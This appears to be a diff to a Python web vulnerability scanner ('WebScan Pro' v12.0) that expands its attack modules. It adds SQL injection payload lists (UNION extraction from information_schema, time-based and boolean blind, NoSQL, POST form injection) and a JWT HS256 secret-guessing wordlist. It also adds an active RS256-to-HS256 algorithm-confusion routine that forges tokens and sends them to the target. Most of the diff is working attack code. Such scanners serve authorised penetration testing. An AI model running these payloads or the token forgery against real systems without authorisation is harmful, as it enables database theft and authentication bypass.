-                       "incorrect syntax near","conversion failed"],
+                       "incorrect syntax near","conversion failed","sql server driver",
+                       "mssqlclient","oledb provider for sql","[microsoft][odbc]",
+                       "sqlexception","procedure or function","expects parameter"],
         "Oracle":     ["ora-01756","ora-00907","ora-00933","oracle error",
-                       "quoted string not properly terminated"],
-        "SQLite":     ["sqlite_","sqlite3_","sql logic error","unrecognized token"],
-        "Generic":    ["sql error","database error","query failed","sql syntax"],
+                       "quoted string not properly terminated","ora-00942",
+                       "ora-01400","ora-00001","oracle database error","oci_"],
+        "SQLite":     ["sqlite_","sqlite3_","sql logic error","unrecognized token",
+                       "sqliteexception","unable to open database file"],
+        "Generic":    ["sql error","database error","query failed","sql syntax",
+                       "db query","syntax error","invalid query","database query",
+                       "sql command","odbc error","data source error"],
     }
 
-    # Focused payload set — top error-based + union + blind (3s timeout for time-based)
+    # v12.0: Payloads — error-based, UNION column count, data extraction, time-based, POST
     SQLI_PAYLOADS = [
-        ("'",                               "error"),
-        ("\"",                              "error"),
-        ("' OR '1'='1'--",                  "error"),
-        ("' OR 1=1--",                      "error"),
-        ("1' ORDER BY 100--",               "error"),
-        ("' UNION SELECT NULL,NULL--",      "error"),
-        ("' UNION SELECT @@version,NULL--", "error"),
-        ('{"$gt":""}',                      "error"),
-        ("'; SELECT SLEEP(3)--",            "time"),
-        ("'; WAITFOR DELAY '0:0:3'--",      "time"),
+        # Basic error-based
+        ("'",                                       "error"),
+        ("\"",                                      "error"),
+        ("\\",                                      "error"),
+        ("' OR '1'='1'--",                          "error"),
+        ("' OR 1=1--",                              "error"),
+        ("') OR ('1'='1",                           "error"),
+        # ORDER BY column count enumeration (triggers error when N > actual columns)
+        ("' ORDER BY 1--",                          "error"),
+        ("' ORDER BY 5--",                          "error"),
+        ("' ORDER BY 10--",                         "error"),
+        ("' ORDER BY 50--",                         "error"),
+        ("1 ORDER BY 100--",                        "error"),
+        # UNION-based data extraction (MySQL, MSSQL, PostgreSQL)
+        ("' UNION SELECT NULL--",                   "error"),
+        ("' UNION SELECT NULL,NULL--",              "error"),
+        ("' UNION SELECT NULL,NULL,NULL--",         "error"),
+        ("' UNION SELECT @@version,NULL--",         "union"),
+        ("' UNION SELECT @@version,NULL,NULL--",    "union"),
+        ("' UNION SELECT version(),NULL--",         "union"),
+        ("' UNION SELECT user(),NULL--",            "union"),
+        ("' UNION SELECT database(),NULL--",        "union"),
+        ("' UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 1--", "union"),
+        # NoSQL injection
+        ('{"$gt":""}',                              "error"),
+        ('{"$ne":null}',                            "error"),
+        # Time-based blind (MySQL, MSSQL)
+        ("'; SELECT SLEEP(3)--",                    "time"),
+        ("'; WAITFOR DELAY '0:0:3'--",              "time"),
+        ("' AND SLEEP(3)--",                        "time"),
+        ("' AND 1=(SELECT 1 FROM (SELECT SLEEP(3))A)--", "time"),
+        # Boolean-based blind
+        ("' AND '1'='1",                            "bool_true"),
+        ("' AND '1'='2",                            "bool_false"),
+        ("1 AND 1=1",                               "bool_true"),
+        ("1 AND 1=2",                               "bool_false"),
     ]
 
     parsed = urlparse(url)
@@ -2147,15 +3460,19 @@ def sqli_scan(url):
         info("No GET parameters found — trying common test parameters")
         params = {"id": ["1"], "page": ["1"], "search": ["test"], "cat": ["1"]}
 
-    _found = threading.Event()
+    _found        = threading.Event()
+    _bool_baselines = {}  # param -> baseline body length for boolean-blind
 
-    # v11.5: Measure baseline BEFORE any injection to prevent false positives on slow servers
-    _sqli_baseline = [3.0]  # default fallback baseline
+    # Measure baseline BEFORE any injection to prevent false positives on slow servers
+    _sqli_baseline = [3.0]
     try:
         _t0 = time.time()
         _rb = rget(url if not parsed.query else parsed._replace(query=urlencode(dict(params), doseq=True)).geturl(), timeout=TIMEOUT)
         _sqli_baseline[0] = time.time() - _t0
         info(f"SQLi baseline response time: {_sqli_baseline[0]:.2f}s")
+        # Store body length per param for boolean-blind baseline
+        for _p in params:
+            _bool_baselines[_p] = len(_rb.text)
     except Exception:
         pass
 
@@ -2165,13 +3482,11 @@ def sqli_scan(url):
         test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
         try:
             if ptype == "time":
-                # Time-based: use baseline + margin; require delay > baseline + 2.5s
                 t_out = max(TIMEOUT, _sqli_baseline[0] + 7)
                 t0 = time.time()
                 r = rget(test_url, timeout=t_out)
                 actual_delay = time.time() - t0
                 delay_above_baseline = actual_delay - _sqli_baseline[0]
-                body_low = r.text.lower()
                 if delay_above_baseline > 2.5:
                     _found.set()
                     vuln(f"Blind SQLi (time-based CONFIRMED) param='{param}' baseline={_sqli_baseline[0]:.1f}s delay={actual_delay:.1f}s (+{delay_above_baseline:.1f}s)", "Critical")
@@ -2181,7 +3496,67 @@ def sqli_scan(url):
                         "description": f"CONFIRMED: Response delayed {actual_delay:.1f}s vs baseline {_sqli_baseline[0]:.1f}s (+{delay_above_baseline:.1f}s above baseline). Param: '{param}'. Payload: {payload[:100]}",
                         "recommendation": "Use parameterized queries. Apply input validation and WAF rules.",
                         "evidence": f"Baseline: {_sqli_baseline[0]:.2f}s | Injected: {actual_delay:.2f}s | Delta: +{delay_above_baseline:.2f}s"})
-            else:
+
+            elif ptype == "union":
+                # UNION-based: check if DB version/data leaked in response
+                r = rget(test_url, timeout=TIMEOUT)
+                body = r.text
+                body_low = body.lower()
+                # Version string patterns from common DBs
+                _ver_pats = ["5.", "8.", "10.", "11.", "mysql","mariadb","postgresql",
+                             "microsoft sql","oracle","sqlite","10.0.","10.1.","14.","15."]
+                for _vp in _ver_pats:
+                    if _vp in body_low and "union" in payload.lower():
+                        _found.set()
+                        vuln(f"UNION SQLi — DB version leaked via UNION SELECT param='{param}'", "Critical")
+                        add("sqli", {"param": param, "payload": payload, "db_type": "UNION-based",
+                            "confirmed": True, "severity": "Critical",
+                            "title": f"SQL Injection — UNION-based Data Extraction CONFIRMED [{param}]",
+                            "description": f"DB version/data leaked in HTTP response body via UNION SELECT. Param: '{param}'. Pattern matched: '{_vp}'",
+                            "recommendation": "Use parameterized queries. Disable verbose DB errors. Apply WAF rules.",
+                            "evidence": f"Pattern '{_vp}' found in UNION SELECT response for param '{param}'"})
+                        return
+                # Also check for error signatures in union responses
+                for db_type, sigs in DB_ERRORS.items():
+                    for sig in sigs:
+                        if sig in body_low:
+                            _found.set()
+                            vuln(f"SQLi [{db_type}] error via UNION param='{param}'", "Critical")
+                            add("sqli", {"param": param, "payload": payload, "db_type": db_type,
+                                "confirmed": True, "severity": "Critical",
+                                "title": f"SQL Injection — {db_type} Error-based (UNION) [{param}]",
+                                "description": f"DB error '{sig}' triggered by UNION payload. Param: '{param}'. Payload: {payload[:100]}",
+                                "recommendation": "Use parameterized queries. Never concatenate user input into SQL.",
+                                "evidence": f"Error signature '{sig}' in response body"})
+                            return
+
+            elif ptype in ("bool_true", "bool_false"):
+                # Boolean-blind: compare body length vs baseline
+                r = rget(test_url, timeout=TIMEOUT)
+                baseline_len = _bool_baselines.get(param, 0)
+                resp_len = len(r.text)
+                diff = abs(resp_len - baseline_len)
+                # Only flag if we have both true and false responses with significant diff
+                # Store in _bool_baselines dict keyed by (param, ptype)
+                _bool_baselines[(param, ptype)] = resp_len
+                true_len  = _bool_baselines.get((param, "bool_true"),  0)
+                false_len = _bool_baselines.get((param, "bool_false"), 0)
+                if true_len and false_len:
+                    diff2 = abs(true_len - false_len)
+                    # Significant body size diff between true/false condition → boolean blind
+                    if diff2 > 50 and not _found.is_set():
+                        # Confirm it's not just noise by checking also vs baseline
+                        if abs(true_len - baseline_len) < abs(false_len - baseline_len):
+                            _found.set()
+                            vuln(f"Boolean-blind SQLi CONFIRMED param='{param}' (true={true_len}B false={false_len}B diff={diff2}B)", "High")
+                            add("sqli", {"param": param, "payload": payload, "db_type": "Boolean-blind",
+                                "confirmed": True, "severity": "High",
+                                "title": f"SQL Injection — Boolean-based Blind CONFIRMED [{param}]",
+                                "description": f"Response body length differs significantly between true/false conditions. True={true_len}B, False={false_len}B, Diff={diff2}B. Param: '{param}'.",
+                                "recommendation": "Use parameterized queries. Apply input validation.",
+                                "evidence": f"True condition body: {true_len}B | False condition body: {false_len}B | Delta: {diff2}B"})
+
+            else:  # error-based
                 r = rget(test_url, timeout=TIMEOUT)
                 body_low = r.text.lower()
                 for db_type, sigs in DB_ERRORS.items():
@@ -2191,7 +3566,7 @@ def sqli_scan(url):
                             vuln(f"SQLi [{db_type}] CONFIRMED param='{param}' payload='{payload[:30]}'", "Critical")
                             add("sqli", {"param": param, "payload": payload, "db_type": db_type,
                                 "confirmed": True, "severity": "Critical",
-                                "title": f"SQL Injection — {db_type} Error CONFIRMED [{param}]",
+                                "title": f"SQL Injection — {db_type} Error-based CONFIRMED [{param}]",
                                 "description": f"CONFIRMED: DB error '{sig}' in response. Param: '{param}'. Payload: {payload[:100]}",
                                 "recommendation": "Use parameterized queries. Never concatenate user input into SQL.",
                                 "evidence": f"Error signature '{sig}' found in HTTP response body"})
@@ -2199,13 +3574,79 @@ def sqli_scan(url):
         except Exception:
             pass
 
+    # --- GET parameter injection ---
     tasks = [(p, pl, pt) for p in list(params.keys())[:6] for pl, pt in SQLI_PAYLOADS]
     with ThreadPoolExecutor(max_workers=min(len(tasks), 20)) as ex:
         futs = [ex.submit(_test, p, pl, pt) for p, pl, pt in tasks]
         for f in as_completed(futs): _pass(f)
 
+    # --- v12.0: POST body injection — find HTML forms with method=post ---
     if not _found.is_set():
-        good("No SQL injection detected on tested parameters")
+        try:
+            _hr = rget(url, timeout=TIMEOUT)
+            _html = _hr.text
+            import re as _re2
+            _forms = _re2.findall(r'<form[^>]*method=["\']?post["\']?[^>]*>.*?</form>',
+                                  _html, _re2.IGNORECASE | _re2.DOTALL)
+            if not _forms:
+                _forms = _re2.findall(r'<form[^>]*>.*?</form>', _html, _re2.IGNORECASE | _re2.DOTALL)
+            for _form_html in _forms[:2]:
+                _action_m = _re2.search(r'action=["\']([^"\']+)["\']', _form_html, _re2.IGNORECASE)
+                _form_url = url
+                if _action_m:
+                    _action = _action_m.group(1)
+                    _form_url = _action if _action.startswith("http") else (url.rstrip("/") + "/" + _action.lstrip("/"))
+                _field_names = _re2.findall(r'<input[^>]*name=["\']([^"\']+)["\']', _form_html, _re2.IGNORECASE)
+                _field_names += _re2.findall(r'<textarea[^>]*name=["\']([^"\']+)["\']', _form_html, _re2.IGNORECASE)
+                if not _field_names:
+                    _field_names = ["username","password","email","search","query","id"]
+                info(f"SQLi POST injection: form at '{_form_url}' fields: {_field_names[:6]}")
+                _POST_PAYLOADS = [
+                    ("'", "error"), ("' OR '1'='1'--", "error"), ("' OR 1=1--", "error"),
+                    ("'; SELECT SLEEP(3)--", "time"), ("'; WAITFOR DELAY '0:0:3'--", "time"),
+                    ("' UNION SELECT @@version,NULL--", "union"),
+                ]
+                for _fname in _field_names[:4]:
+                    for _pl, _pt in _POST_PAYLOADS:
+                        if _found.is_set(): break
+                        _post_data = {_fn: "test" for _fn in _field_names}
+                        _post_data[_fname] = _pl
+                        try:
+                            if _pt == "time":
+                                _t0p = time.time()
+                                _rp = rpost(_form_url, data=_post_data, timeout=max(TIMEOUT, 10))
+                                _delayp = time.time() - _t0p - _sqli_baseline[0]
+                                if _delayp > 2.5:
+                                    _found.set()
+                                    vuln(f"Blind SQLi POST CONFIRMED field='{_fname}' delay=+{_delayp:.1f}s", "Critical")
+                                    add("sqli", {"param": f"POST:{_fname}", "payload": _pl,
+                                        "db_type": "Blind/Time-based/POST", "confirmed": True, "severity": "Critical",
+                                        "title": f"SQL Injection — POST Blind Time-based CONFIRMED [{_fname}]",
+                                        "description": f"POST form field '{_fname}' vulnerable to time-based SQLi. Delay: +{_delayp:.1f}s",
+                                        "recommendation": "Use parameterized queries for all POST parameters.",
+                                        "evidence": f"POST to {_form_url} field '{_fname}' delayed {_delayp:.1f}s above baseline"})
+                            else:
+                                _rp = rpost(_form_url, data=_post_data, timeout=TIMEOUT)
+                                _blw = _rp.text.lower()
+                                for _dbt, _sigs in DB_ERRORS.items():
+                                    for _sg in _sigs:
+                                        if _sg in _blw:
+                                            _found.set()
+                                            vuln(f"SQLi [{_dbt}] POST CONFIRMED field='{_fname}'", "Critical")
+                                            add("sqli", {"param": f"POST:{_fname}", "payload": _pl,
+                                                "db_type": f"{_dbt}/POST", "confirmed": True, "severity": "Critical",
+                                                "title": f"SQL Injection — {_dbt} POST Error-based CONFIRMED [{_fname}]",
+                                                "description": f"POST field '{_fname}' triggers DB error '{_sg}'. Form: {_form_url}",
+                                                "recommendation": "Use parameterized queries for all POST parameters.",
+                                                "evidence": f"Error '{_sg}' in POST response for field '{_fname}'"})
+                                            break
+                        except Exception:
+                            pass
+        except Exception as _ep:
+            info(f"SQLi POST scan: {_ep}")
+
+    if not _found.is_set():
+        good("No SQL injection detected on tested parameters (GET + POST)")
     _module_done("sqli")
 
 # ═══ MODULE 13 — XSS (parallel payload testing) ══════════════════
@@ -2742,12 +4183,26 @@ def jwt_scan(url):
                 except Exception:
                     pass
 
-            # Check 2: Weak secret brute-force (HS256)
+            # Check 2: Weak secret brute-force (HS256) — v12.0: expanded 50+ secrets
             if alg == "HS256":
                 COMMON_SECRETS = [
-                    "secret","password","123456","admin","key","jwt",
-                    "supersecret","mysecret","changeme","test","qwerty",
-                    "jwtSecret","secretkey","your-256-bit-secret","hs256",
+                    # Most common
+                    "secret","password","123456","admin","key","jwt","token",
+                    "supersecret","mysecret","changeme","test","qwerty","pass",
+                    "jwtSecret","secretkey","your-256-bit-secret","hs256","hs512",
+                    # App/framework defaults
+                    "secret_key","app_secret","api_secret","app_key","laravel",
+                    "django-insecure-","flask","express","rails","symfony",
+                    "spring","node","nestjs","fastapi","nextauth",
+                    # Keyboard walks / simple patterns
+                    "1234567890","abcdefgh","abcdefghijklmnop","qazwsxedc",
+                    "password123","admin123","abc123","12345678","111111",
+                    # Common dev placeholders
+                    "todo","fixme","hack","dev","development","production","staging",
+                    "private","public","shared","global","default","example","sample",
+                    "your_secret_key","mysecretpassword","verysecretkey","topsecret",
+                    # Short tokens devs sometimes use
+                    "s3cr3t","p@ssw0rd","Passw0rd","S3cret","JWT_SECRET","TOKEN",
                 ]
                 for secret in COMMON_SECRETS:
                     try:
@@ -2766,14 +4221,48 @@ def jwt_scan(url):
                     except Exception:
                         pass
 
-            # Check 3: RS256 → HS256 algorithm confusion (v9.0)
+            # Check 3: RS256 → HS256 algorithm confusion (v12.0: active test)
             if alg == "RS256":
-                vuln(f"JWT uses RS256 — test algorithm confusion attack (RS256→HS256)", "Medium")
-                add("jwt", {"token_prefix": token[:30], "attack": "alg_confusion",
-                    "severity": "Medium",
-                    "title": "JWT RS256 → HS256 Algorithm Confusion Risk",
-                    "description": "JWT uses RS256 (asymmetric). If the server accepts HS256 tokens signed with the public key as the secret, an attacker who knows the public key can forge tokens.",
-                    "recommendation": "Explicitly configure JWT library to only accept RS256. Reject HS256 tokens on RSA-keyed endpoints."})
+                info("JWT RS256 detected — attempting algorithm confusion (RS256→HS256)")
+                _alg_confused = False
+                # Try to fetch JWKS / public key from common well-known endpoints
+                _parsed_url = urlparse(url)
+                _base = f"{_parsed_url.scheme}://{_parsed_url.netloc}"
+                _jwks_paths = ["/.well-known/jwks.json", "/.well-known/openid-configuration",
+                               "/oauth/certs", "/api/auth/keys", "/auth/keys", "/jwks"]
+                for _jpath in _jwks_paths:
+                    try:
+                        _jr = rget(_base + _jpath, timeout=5)
+                        if _jr.status_code == 200 and ("keys" in _jr.text or "BEGIN PUBLIC" in _jr.text):
+                            # Got a JWKS — craft HS256 token using public key as secret
+                            _pub_data = _jr.text.encode()
+                            _new_hdr_alg = dict(hdr); _new_hdr_alg["alg"] = "HS256"
+                            if "kid" in _new_hdr_alg: del _new_hdr_alg["kid"]
+                            _nh_b64 = _b64.urlsafe_b64encode(json.dumps(_new_hdr_alg).encode()).rstrip(b"=").decode()
+                            _sig = _b64.urlsafe_b64encode(
+                                hmac.new(_pub_data[:512], f"{_nh_b64}.{parts[1]}".encode(), hashlib.sha256).digest()
+                            ).rstrip(b"=").decode()
+                            _forged_hs = f"{_nh_b64}.{parts[1]}.{_sig}"
+                            _rtest = rget(url, headers={"Authorization": f"Bearer {_forged_hs}"}, timeout=6)
+                            if _rtest.status_code not in (401, 403):
+                                _alg_confused = True
+                                vuln("JWT RS256→HS256 Algorithm Confusion CONFIRMED — server accepted forged HS256 token", "Critical")
+                                add("jwt", {"token_prefix": token[:30], "attack": "rs256_to_hs256_confusion",
+                                    "severity": "Critical",
+                                    "title": "JWT Algorithm Confusion CONFIRMED (RS256→HS256)",
+                                    "description": f"Server accepted an HS256-signed token using the public key from {_jpath} as the HMAC secret. Full authentication bypass is possible.",
+                                    "recommendation": "Lock JWT library to accept ONLY RS256. Never allow HS256 on RSA-keyed endpoints.",
+                                    "evidence": f"JWKS at {_base+_jpath} | Forged HS256 token accepted (HTTP {_rtest.status_code})"})
+                            break
+                    except Exception:
+                        continue
+                if not _alg_confused:
+                    warn("JWT RS256 — algorithm confusion risk flagged (could not auto-confirm: no accessible JWKS)")
+                    add("jwt", {"token_prefix": token[:30], "attack": "alg_confusion",
+                        "severity": "Medium",
+                        "title": "JWT RS256 → HS256 Algorithm Confusion Risk",
+                        "description": "JWT uses RS256. If the server accepts HS256 tokens signed with the public key as secret, an attacker can forge tokens. Manual test recommended.",
+                        "recommendation": "Explicitly configure JWT library to only accept RS256. Reject HS256 tokens on RSA-keyed endpoints."})
 
             # Check 4: kid header injection (v9.0)
             if "kid" in hdr:
@@ -3802,6 +5291,9 @@ def parse_args():
   python3 webscan_pro.py http://target.com --only sqli,xss,nosql_inject
   python3 webscan_pro.py http://target.com --only ssl,headers,cors
   python3 webscan_pro.py http://target.com --fail-on-severity high
+  python3 webscan_pro.py http://target.com --openapi https://target.com/api/openapi.json
+  python3 webscan_pro.py http://target.com --openapi ./local-spec.yaml --llm-triage
+  python3 webscan_pro.py http://target.com --llm-triage --llm-provider anthropic
 """)
     p.add_argument("url",             nargs="?",   help="Target URL (e.g. http://target.com)")
     p.add_argument("-v","--verbose",  action="store_true", help="Verbose output — show every request")
@@ -3843,10 +5335,21 @@ def parse_args():
                          "graphql, oauth2, deserialization, websocket, prototype_pollution, api_intel, "
                          "nosql_inject, sspp, oob_blind, file_upload, postmessage, acct_enum, login_brute, "
                          "osint_email, osint_dns, osint_dorks, osint_breach, osint_github, osint_js, "
-                         "dom_xss, cache_poisoning, hpp, cve_mapping, cloud_bucket, s3_brute, wayback_urls. "
-                         "Example: --only sqli,xss,nosql_inject"))
+                         "dom_xss, cache_poisoning, hpp, cve_mapping, cloud_bucket, s3_brute, wayback_urls, "
+                         "zap_scan, msf_scan, traffic_capture, openvas_scan, nessus_scan, "
+                         "http_smuggling, backup_files, email_security. "
+                         "Example: --only sqli,xss,nosql_inject or --only zap_scan,openvas_scan"))
     p.add_argument("--rate",          type=float, default=0.0,
                    help="Seconds between requests — rate limit (default: 0 = unlimited)")
+    # v12.0 flags
+    p.add_argument("--openapi",       default=None,
+                   help="OpenAPI/Swagger spec URL or file path to ingest before scanning "
+                        "(e.g. https://target.com/api/openapi.json or ./spec.yaml)")
+    p.add_argument("--llm-triage",    action="store_true",
+                   help="Run AI LLM triage after scan to filter false positives "
+                        "(requires ANTHROPIC_API_KEY, OPENAI_API_KEY, GOOGLE_API_KEY, GROQ_API_KEY, or OLLAMA_HOST)")
+    p.add_argument("--llm-provider",  default=None,
+                   help="Force specific LLM provider: anthropic|openai|google|groq|ollama (auto-detected by default)")
     return p.parse_args()
 
 # ═══ MAIN ═════════════════════════════════════════════════════════
@@ -3958,7 +5461,7 @@ def main():
 
     info(f"Target: {url}")
     info(f"Version: WebScan Pro v{VERSION}")
-    info(f"Modules: 80  |  Ports: {len(PORTS_TOP)}  |  WAF Sigs: {len(WAF_SIGS_GLOBAL)}")
+    info(f"Modules: 90  |  Ports: {len(PORTS_TOP)}  |  WAF Sigs: {len(WAF_SIGS_GLOBAL)}")
     info(f"Sensitive paths: {len(SENSITIVE_PATHS)}  |  SSRF targets: 18")
     info(f"Output: {args.output}")
     info(f"Checkpoint: {CHECKPOINT_FILE}")
@@ -3967,6 +5470,13 @@ def main():
     def _run(fn, *a, **kw):
         try: fn(*a, **kw)
         except Exception as _e: err(f"{fn.__name__} error: {_e}")
+
+    # ── PHASE 0: OPENAPI INGESTION (pre-scan endpoint discovery) ───
+    if getattr(args, "openapi", None):
+        section("PHASE 0 — OPENAPI/SWAGGER ENDPOINT INGESTION","📋")
+        openapi_ingest(args.openapi, url)
+        if OPENAPI_ENDPOINTS:
+            info(f"Phase 0 complete: {len(OPENAPI_ENDPOINTS)} API endpoint(s) will be injected into scan modules")
 
     # ── PHASE 1: RECON ─────────────────────────────────────────────
     section("PHASE 1 — RECONNAISSANCE","🔍")
@@ -4005,6 +5515,32 @@ def main():
                               urlscan_key=_urlscan_key  or None)
     else:
         info("API Intelligence: No API keys set — set VT_API_KEY, SHODAN_API_KEY, ABUSEIPDB_KEY, URLSCAN_KEY in env")
+
+    # ── PHASE 1c: EXTERNAL TOOL INTEGRATION ───────────────────────────
+    # ZAP, Metasploit, tshark, OpenVAS, Nessus (skips if tool not installed)
+    section("PHASE 1c — EXTERNAL TOOL INTEGRATION","🔧")
+    _ext_tasks = [
+        lambda: _run(zap_scan, url),
+        lambda: _run(msf_http_scan, url, domain, _target_ip),
+        lambda: _run(tshark_capture, url, domain, _target_ip),
+        lambda: _run(openvas_scan, url, domain, _target_ip),
+        lambda: _run(nessus_scan, url, domain, _target_ip),
+    ]
+    with ThreadPoolExecutor(max_workers=3) as _ep:
+        _efuts = [_ep.submit(_t) for _t in _ext_tasks]
+        for _f in as_completed(_efuts): _pass(_f)
+
+    # ── PHASE 1d: ADVANCED DETECTION ──────────────────────────────────
+    # HTTP Smuggling, Backup Files, Email Security
+    section("PHASE 1d — ADVANCED DETECTION","🔬")
+    _adv_tasks = [
+        lambda: _run(http_smuggling_scan, url),
+        lambda: _run(backup_file_scan, url),
+        lambda: _run(email_security_scan, url, domain),
+    ]
+    with ThreadPoolExecutor(max_workers=3) as _ea:
+        _afuts = [_ea.submit(_t) for _t in _adv_tasks]
+        for _f in as_completed(_afuts): _pass(_f)
 
     # ── PHASE 1b: OSINT — all 6 modules parallel ───────────────────
     section("PHASE 1b — OSINT INTELLIGENCE","🔎")
@@ -4057,6 +5593,19 @@ def main():
     with ThreadPoolExecutor(max_workers=8) as _p2:
         _futs2 = [_p2.submit(t) for t in _p2_tasks]
         for _f in as_completed(_futs2): _pass(_f)
+
+    # ── PHASE 2: OpenAPI injection (runs extra scans on API endpoints) ─
+    if OPENAPI_ENDPOINTS:
+        section("PHASE 2 (OpenAPI) — API ENDPOINT INJECTION","🔗")
+        info(f"Injecting {len(OPENAPI_ENDPOINTS)} OpenAPI endpoint(s) into SQLi, XSS, IDOR scanners...")
+        _oapi_tasks = [
+            lambda: _run(_openapi_inject_sqli, url),
+            lambda: _run(_openapi_inject_xss,  url),
+            lambda: _run(_openapi_inject_idor,  url),
+        ]
+        with ThreadPoolExecutor(max_workers=3) as _oapi_ex:
+            _oapi_futs = [_oapi_ex.submit(t) for t in _oapi_tasks]
+            for _f in as_completed(_oapi_futs): _pass(_f)
 
     # ── PHASE 2b + 2c: ADVANCED — all modules parallel ─────────────
     if not args.no_advanced:
@@ -4159,6 +5708,35 @@ def main():
             info("PDF skipped (pip3 install weasyprint to enable)")
     except Exception as e:
         warn(f"PDF generation failed: {e}")
+
+    # ── PHASE END: LLM TRIAGE (post-scan AI analysis) ──────────────
+    _do_triage = getattr(args, "llm_triage", False)
+    # Also auto-trigger if any LLM key is set and --llm-triage not explicitly disabled
+    _any_llm_key = any([
+        os.environ.get("ANTHROPIC_API_KEY","").strip(),
+        os.environ.get("OPENAI_API_KEY","").strip(),
+        os.environ.get("GOOGLE_API_KEY","").strip(),
+        os.environ.get("GROQ_API_KEY","").strip(),
+        os.environ.get("OLLAMA_HOST","").strip(),
+    ])
+    if _do_triage or _any_llm_key:
+        # Override provider if --llm-provider given
+        _force_prov = getattr(args, "llm_provider", None)
+        if _force_prov:
+            _prov_map = {
+                "anthropic": ("ANTHROPIC_API_KEY", os.environ.get("ANTHROPIC_API_KEY","")),
+                "openai":    ("OPENAI_API_KEY",    os.environ.get("OPENAI_API_KEY","")),
+                "google":    ("GOOGLE_API_KEY",    os.environ.get("GOOGLE_API_KEY","")),
+                "groq":      ("GROQ_API_KEY",      os.environ.get("GROQ_API_KEY","")),
+                "ollama":    ("OLLAMA_HOST",        os.environ.get("OLLAMA_HOST","")),
+            }
+            if _force_prov in _prov_map:
+                _env_k, _env_v = _prov_map[_force_prov]
+                if not _env_v:
+                    warn(f"--llm-provider={_force_prov} but {_env_k} env var is not set — triage skipped")
+                    _do_triage = False
+        if _do_triage or _any_llm_key:
+            llm_triage_scan()
 
     # ── SUMMARY ────────────────────────────────────────────────────
     counts = _sev_counts()
